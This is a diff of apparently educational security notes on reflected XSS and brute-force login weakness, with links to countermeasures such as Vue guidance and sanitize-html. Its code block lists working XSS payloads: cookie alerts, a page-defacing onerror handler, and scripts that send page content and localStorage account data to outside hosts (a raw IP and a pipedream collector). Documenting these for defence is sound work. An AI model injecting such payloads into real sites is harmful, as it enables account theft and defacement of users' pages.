@@ -19,13 +19,20 @@ https://www.imperva.com/learn/application-security/reflected-xss-attacks/#:~:tex
 https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
 ```js
 <script>alert(document.cookie); </script>
-<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
+<img src="http://url.to.file.which/not.exist" onerror= document.body.innerHTML = "<h1>You got hacked</h1>";>
 <IMG SRC=j&#X41vascript:alert('test2')>
 <script>new Image().src="https://192.165.159.122/fakepg.php?output="+document.body.innerHTML</script>
+<img 
+  src="https://jnx.me/img/profile.jpg" 
+  style="display:none" 
+  onload="fetch('https://enj917gkdfyp.x.pipedream.net/', {method: 'POST', body: localStorage.getItem('account')})"
+>
 ```
 
 ## Maßnahmen
 https://v2.vuejs.org/v2/guide/security.html#:~:text=The%20most%20fundamental%20security%20rule%20when%20using%20Vue,during%20server-side%20rendering.%20An%20example%20of%20such%20usage%3A
+
+https://www.npmjs.com/package/sanitize-html
 
 # Brute-force attack
 Is possible because we do not check how many requests have been sent by one user
@@ -52,3 +59,6 @@ Password:<br>
 <br>
 <input type="submit" value="Login"></br>
 ```
+
+## Maßnahmen
+https://www.npmjs.com/package/sanitize-html
